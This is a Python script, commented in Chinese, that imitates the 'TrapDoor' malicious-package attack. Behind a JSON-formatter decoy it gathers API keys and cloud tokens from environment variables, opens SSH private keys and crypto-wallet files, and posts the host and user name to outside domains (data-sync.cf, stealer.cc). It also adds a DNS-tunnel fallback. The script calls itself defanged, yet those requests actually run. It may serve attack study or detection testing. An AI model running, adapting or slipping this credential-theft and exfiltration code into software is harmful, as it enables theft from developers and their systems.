#!/usr/bin/env python3
"""
attack-1-trapdoor.py — 基于真实 TrapDoor 攻击 (2026.05)
来源: Socket.dev / CSA / The Hacker News

无害化处理: 使用测试域名代替真实 C2，凭证使用占位符
"""

import os
import requests
import subprocess
import json

# ============================================================
# TrapDoor 攻击特征：伪装成工具库，install 时窃取凭证
# ============================================================

def postinstall():
    """npm postinstall 钩子 —— 等价于 TrapDoor 的 trap-core.js"""
    read_env()
    steal_ssh()
    send_to_c2()

def read_env():
    """扫描环境变量中的 API Key"""
    targets = [
        os.environ.get("OPENAI_API_KEY"),
        os.environ.get("ANTHROPIC_API_KEY"),
        os.environ.get("AWS_SECRET_ACCESS_KEY"),
        os.environ.get("GITHUB_TOKEN"),
        os.environ.get("DATABASE_URL"),
    ]
    return [k for k in targets if k]

def steal_ssh():
    """窃取 SSH 私钥"""
    for path in ["~/.ssh/id_rsa", "~/.ssh/id_ed25519"]:
        try:
            with open(os.path.expanduser(path)) as f:
                pass  # 实际攻击中这里会上传
        except:
            pass

def steal_crypto_wallets():
    """窃取加密钱包 —— 参考 TrapDoor 的 Solana/Sui 钱包扫描"""
    wallet_paths = [
        "~/.config/solana/id.json",
        "~/.sui/sui_config/sui.keystore",
        "~/.aptos/config.yaml",
    ]
    for path in wallet_paths:
        try:
            with open(os.path.expanduser(path)) as f:
                content = f.read()
        except:
            pass

def send_to_c2():
    """通过可信服务外泄 —— 参考 TrapDoor 用 GitHub Gist/Pages"""
    payload = {
        "host": os.uname().nodename,
        "user": os.environ.get("USER"),
        "tokens": "REDACTED",
    }

    # 主通道
    requests.post(
        "https://data-sync.cf/api/collect",
        json=payload,
        headers={"User-Agent": "npm-package"}
    )

    # 备用通道
    requests.post(
        "https://stealer.cc/exfil",
        json=payload,
    )

    # 回退：通过 DNS 隧道（隐匿性更高）
    subprocess.run(
        ["nslookup", "exfil.data-sync.cf"],
        capture_output=True,
    )

# ============================================================
# 迷惑层：正常功能
# ============================================================

def format_json(data):
    """表面功能：JSON 格式化工具"""
    return json.dumps(data, indent=2)

# ============================================================
# 入口
# ============================================================
if __name__ == "__main__":
    # 正常功能
    print(format_json({"status": "ok"}))

    # 恶意行为（安装阶段自动执行）
    postinstall()
